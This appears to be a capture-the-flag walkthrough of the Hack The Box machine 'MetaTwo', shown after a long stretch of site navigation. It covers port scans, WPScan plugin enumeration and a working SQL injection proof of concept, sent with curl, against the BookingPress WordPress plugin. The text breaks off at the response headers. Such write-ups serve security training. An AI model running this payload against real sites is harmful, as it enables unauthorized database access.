      <a href="../Pathfinder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pathfinder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Photobomb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Photobomb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RedPanda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RedPanda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Resolute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Resolute
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Retired/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Retired
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Ropme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ropme
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Shared/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shared
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Shield/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shield
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Shocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shocker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Shoppy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shoppy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Sniper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sniper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Support/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Support
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Under_Construction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Under Construction
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../UpDown/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    UpDown
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vaccine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vaccine
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../You_know_0xDiablos/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    You know 0xDiablos
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../TryHackMe%21/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    TryHackMe!
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            TryHackMe!
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/AdventOfCyber2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AdventOfCyber2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/DailyBugle/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DailyBugle
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/Internal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/Relevant/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Relevant
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/Wonderland/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wonderland
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/YearOfTheFox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    YearOfTheFox
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TryHackMe%21/YearOfTheJellyfish/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    YearOfTheJellyfish
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
        <li class="md-nav__item">
      <a href="https://blog.anthares101.com/" class="md-nav__link" target="_blank" style="padding-right: 115px; padding-left: 8px;">
        <span style="display: inline-block;" class="twemoji md-social__link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M64 496C64 504.8 56.75 512 48 512h-32C7.25 512 0 504.8 0 496V32c0-17.75 14.25-32 32-32s32 14.25 32 32V496zM476.3 0c-6.365 0-13.01 1.35-19.34 4.233c-45.69 20.86-79.56 27.94-107.8 27.94c-59.96 0-94.81-31.86-163.9-31.87C160.9 .3055 131.6 4.867 96 15.75v350.5c32-9.984 59.87-14.1 84.85-14.1c73.63 0 124.9 31.78 198.6 31.78c31.91 0 68.02-5.971 111.1-23.09C504.1 355.9 512 344.4 512 332.1V30.73C512 11.1 495.3 0 476.3 0z"/></svg></span>
        Raptor Blog
      </a>
    </li>
  </ul>
</nav>

                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-80" class="md-nav__link">
    <span class="md-ellipsis">
      Port 80
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-21" class="md-nav__link">
    <span class="md-ellipsis">
      Port 21
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inside-the-machine-as-jnelson" class="md-nav__link">
    <span class="md-ellipsis">
      Inside the machine as jnelson
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inside the machine as jnelson">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="metatwo">MetaTwo</h1>
<h2 id="nmap">Nmap</h2>
<p>Let's start with an Nmap scan as usual: </p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.232.102
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-10-31<span class="w"> </span><span class="m">00</span>:16<span class="w"> </span>EDT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.232.102
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.061s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65532</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE
<span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">28</span>.00<span class="w"> </span>seconds
</code></pre></div>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p21,22,80<span class="w"> </span><span class="m">10</span>.129.232.102<span class="w">                      </span>
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-10-31<span class="w"> </span><span class="m">00</span>:19<span class="w"> </span>EDT
Stats:<span class="w"> </span><span class="m">0</span>:03:01<span class="w"> </span>elapsed<span class="p">;</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>hosts<span class="w"> </span>completed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>up<span class="o">)</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span>undergoing<span class="w"> </span>Script<span class="w"> </span>Scan
NSE<span class="w"> </span>Timing:<span class="w"> </span>About<span class="w"> </span><span class="m">99</span>.76%<span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span>ETC:<span class="w"> </span><span class="m">00</span>:22<span class="w"> </span><span class="o">(</span><span class="m">0</span>:00:00<span class="w"> </span>remaining<span class="o">)</span>
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.232.102
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.053s<span class="w"> </span>latency<span class="o">)</span>.

PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
<span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp?
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.4p1<span class="w"> </span>Debian<span class="w"> </span><span class="m">5</span>+deb11u1<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.18.0
<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>http://metapress.htb/
<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">230</span>.36<span class="w"> </span>seconds
</code></pre></div>
<p>Only 3 ports open, I will start with the port 80 because the rest of them will probably require authentication.</p>
<h2 id="port-80">Port 80</h2>
<p>It is redirecting to http://metapress.htb/ so I added it to my <code>/etc/hosts</code> file. According to the source code of the page, looks like it is Wordpress 5.6.2 and looking around the articles I found something interesting: http://metapress.htb/events/. This page allows a user to register for an event, the plugin name is something like Bookingpress.</p>
<p>I decided to throw WPScan at it with the plugins detection mode set to aggressive to check for installed plugins:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
└─$<span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://metapress.htb/<span class="w"> </span>--plugins-detection<span class="w"> </span>aggressive
_______________________________________________________________
<span class="w">         </span>__<span class="w">          </span>_______<span class="w">   </span>_____
<span class="w">         </span><span class="se">\ \ </span><span class="w">       </span>/<span class="w"> </span>/<span class="w">  </span>__<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>____<span class="p">|</span>
<span class="w">          </span><span class="se">\ \ </span><span class="w"> </span>/<span class="se">\ </span><span class="w"> </span>/<span class="w"> </span>/<span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>___<span class="w">   </span>___<span class="w">  </span>__<span class="w"> </span>_<span class="w"> </span>_<span class="w"> </span>__<span class="w"> </span>®
<span class="w">           </span><span class="se">\ \/</span><span class="w">  </span><span class="se">\/</span><span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w">  </span>___/<span class="w"> </span><span class="se">\_</span>__<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>__<span class="p">|</span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ \</span>
<span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
<span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>

<span class="s1">         WordPress Security Scanner by the WPScan Team</span>
<span class="s1">                         Version 3.8.22</span>
<span class="s1">       Sponsored by Automattic - https://automattic.com/</span>
<span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span>
<span class="s1">_______________________________________________________________</span>

<span class="s1">[+] URL: http://metapress.htb/ [10.129.232.102]</span>
<span class="s1">[+] Started: Mon Oct 31 00:33:32 2022</span>

<span class="s1">Interesting Finding(s):</span>

<span class="s1">[+] Headers</span>
<span class="s1"> | Interesting Entries:</span>
<span class="s1"> |  - Server: nginx/1.18.0</span>
<span class="s1"> |  - X-Powered-By: PHP/8.0.24</span>
<span class="s1"> | Found By: Headers (Passive Detection)</span>
<span class="s1"> | Confidence: 100%</span>

<span class="s1">[+] robots.txt found: http://metapress.htb/robots.txt</span>
<span class="s1"> | Interesting Entries:</span>
<span class="s1"> |  - /wp-admin/</span>
<span class="s1"> |  - /wp-admin/admin-ajax.php</span>
<span class="s1"> | Found By: Robots Txt (Aggressive Detection)</span>
<span class="s1"> | Confidence: 100%</span>

<span class="s1">[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php</span>
<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="s1"> | Confidence: 100%</span>
<span class="s1"> | References:</span>
<span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span>
<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span>
<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span>
<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span>

<span class="s1">[+] WordPress readme found: http://metapress.htb/readme.html</span>
<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="s1"> | Confidence: 100%</span>

<span class="s1">[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php</span>
<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="s1"> | Confidence: 60%</span>
<span class="s1"> | References:</span>
<span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
<span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>

<span class="s1">[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span>
<span class="s1"> | Found By: Rss Generator (Passive Detection)</span>
<span class="s1"> |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span>
<span class="s1"> |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span>

<span class="s1">[+] WordPress theme in use: twentytwentyone</span>
<span class="s1"> | Location: http://metapress.htb/wp-content/themes/twentytwentyone/</span>
<span class="s1"> | Last Updated: 2022-05-24T00:00:00.000Z</span>
<span class="s1"> | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt</span>
<span class="s1"> | [!] The version is out of date, the latest version is 1.6</span>
<span class="s1"> | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1</span>
<span class="s1"> | Style Name: Twenty Twenty-One</span>
<span class="s1"> | Style URI: https://wordpress.org/themes/twentytwentyone/</span>
<span class="s1"> | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...</span>
<span class="s1"> | Author: the WordPress team</span>
<span class="s1"> | Author URI: https://wordpress.org/</span>
<span class="s1"> |</span>
<span class="s1"> | Found By: Css Style In Homepage (Passive Detection)</span>
<span class="s1"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span>
<span class="s1"> |</span>
<span class="s1"> | Version: 1.1 (80% confidence)</span>
<span class="s1"> | Found By: Style (Passive Detection)</span>
<span class="s1"> |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: &#39;</span>Version:<span class="w"> </span><span class="m">1</span>.1<span class="s1">&#39;</span>

<span class="s1">[+] Enumerating All Plugins (via Aggressive Methods)</span>
<span class="s1"> Checking Known Locations - Time: 00:35:47 &lt;===============================&gt; (100928 / 100928) 100.00% Time: 00:35:47</span>
<span class="s1">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span>

<span class="s1">[i] Plugin(s) Identified:</span>

<span class="s1">[+] bookingpress-appointment-booking</span>
<span class="s1"> | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/</span>
<span class="s1"> | Last Updated: 2022-10-22T14:11:00.000Z</span>
<span class="s1"> | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt</span>
<span class="s1"> | [!] The version is out of date, the latest version is 1.0.45</span>
<span class="s1"> |</span>
<span class="s1"> | Found By: Known Locations (Aggressive Detection)</span>
<span class="s1"> |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200</span>
<span class="s1"> |</span>
<span class="s1"> | Version: 1.0.10 (100% confidence)</span>
<span class="s1"> | Found By: Readme - Stable Tag (Aggressive Detection)</span>
<span class="s1"> |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt</span>
<span class="s1"> | Confirmed By: Translation File (Aggressive Detection)</span>
<span class="s1"> |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: &#39;</span>sion:<span class="w"> </span>BookingPress<span class="w"> </span>Appointment<span class="w"> </span>Booking<span class="w"> </span>v1.0.10<span class="err">&#39;</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>feed
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Location:<span class="w"> </span>http://metapress.htb/wp-content/plugins/feed/
<span class="w"> </span><span class="p">|</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://metapress.htb/wp-content/plugins/feed/,<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>
<span class="w"> </span><span class="p">|</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>The<span class="w"> </span>version<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>determined.

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>leira-roles
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Location:<span class="w"> </span>http://metapress.htb/wp-content/plugins/leira-roles/
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Latest<span class="w"> </span>Version:<span class="w"> </span><span class="m">1</span>.1.8.0<span class="w"> </span><span class="o">(</span>up<span class="w"> </span>to<span class="w"> </span>date<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Last<span class="w"> </span>Updated:<span class="w"> </span><span class="m">2022</span>-05-05T05:13:00.000Z
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Readme:<span class="w"> </span>http://metapress.htb/wp-content/plugins/leira-roles/README.txt
<span class="w"> </span><span class="p">|</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://metapress.htb/wp-content/plugins/leira-roles/,<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>
<span class="w"> </span><span class="p">|</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Version:<span class="w"> </span><span class="m">1</span>.1.8.0<span class="w"> </span><span class="o">(</span><span class="m">100</span>%<span class="w"> </span>confidence<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Readme<span class="w"> </span>-<span class="w"> </span>Stable<span class="w"> </span>Tag<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://metapress.htb/wp-content/plugins/leira-roles/README.txt
<span class="w"> </span><span class="p">|</span><span class="w"> </span>Confirmed<span class="w"> </span>By:<span class="w"> </span>Readme<span class="w"> </span>-<span class="w"> </span>ChangeLog<span class="w"> </span>Section<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://metapress.htb/wp-content/plugins/leira-roles/README.txt

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span><span class="o">(</span>via<span class="w"> </span>Passive<span class="w"> </span>and<span class="w"> </span>Aggressive<span class="w"> </span>Methods<span class="o">)</span>
<span class="w"> </span>Checking<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span>-<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:00:02<span class="w"> </span>&lt;<span class="o">======================================</span>&gt;<span class="w"> </span><span class="o">(</span><span class="m">137</span><span class="w"> </span>/<span class="w"> </span><span class="m">137</span><span class="o">)</span><span class="w"> </span><span class="m">100</span>.00%<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:00:02

<span class="o">[</span>i<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span>Found.

<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>WPScan<span class="w"> </span>API<span class="w"> </span>Token<span class="w"> </span>given,<span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>result<span class="w"> </span>vulnerability<span class="w"> </span>data<span class="w"> </span>has<span class="w"> </span>not<span class="w"> </span>been<span class="w"> </span>output.
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>free<span class="w"> </span>API<span class="w"> </span>token<span class="w"> </span>with<span class="w"> </span><span class="m">25</span><span class="w"> </span>daily<span class="w"> </span>requests<span class="w"> </span>by<span class="w"> </span>registering<span class="w"> </span>at<span class="w"> </span>https://wpscan.com/register

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Finished:<span class="w"> </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">01</span>:09:35<span class="w"> </span><span class="m">2022</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Requests<span class="w"> </span>Done:<span class="w"> </span><span class="m">101088</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Cached<span class="w"> </span>Requests:<span class="w"> </span><span class="m">43</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Data<span class="w"> </span>Sent:<span class="w"> </span><span class="m">30</span>.989<span class="w"> </span>MB
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Data<span class="w"> </span>Received:<span class="w"> </span><span class="m">36</span>.31<span class="w"> </span>MB
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Memory<span class="w"> </span>used:<span class="w"> </span><span class="m">457</span>.629<span class="w"> </span>MB
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Elapsed<span class="w"> </span>time:<span class="w"> </span><span class="m">00</span>:36:02
</code></pre></div>
<p>The booking press plugin is vulnerable to SQL injection according to <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank">this article</a>. First, we need a nonce that can be found searching for <code>bookingpress_front_get_category_services</code> in the source code of the page where the plugin code is embedded, in my case the nonce is <code>bf440717c1</code>. Now we can try the PoC:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
└─$<span class="w"> </span>curl<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;http://metapress.htb/wp-admin/admin-ajax.php&#39;</span><span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;action=bookingpress_front_get_category_services&amp;_wpnonce=bf440717c1&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;</span>
HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
Server:<span class="w"> </span>nginx/1.18.0
Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">31</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="m">05</span>:14:19<span class="w"> </span>GMT
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
Transfer-Encoding:<span class="w"> </span>chunked
Connection:<span class="w"> </span>keep-alive
X-Powered-By:<span class="w"> </span>PHP/8.0.24
X-Robots-Tag:<span class="w"> </span>noindex
X-Content-Type-Options:<span class="w"> </span>nosniff
Expires:<span class="w"> </span>Wed,<span class="w"> </span><span class="m">11</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">1984</span><span class="w"> </span><span class="m">05</span>:00:00<span class="w"> </span>GMT
Cache-Control:<span class="w"> </span>no-cache,<span class="w"> </span>must-revalidate,<span class="w"> </span>max-age<span class="o">=</span><span class="m">0</span>
X-Frame-Options:<span class="w"> </span>SAMEORIGIN
Referrer-Policy:<span class="w"> </span>strict-origin-when-cross-origin

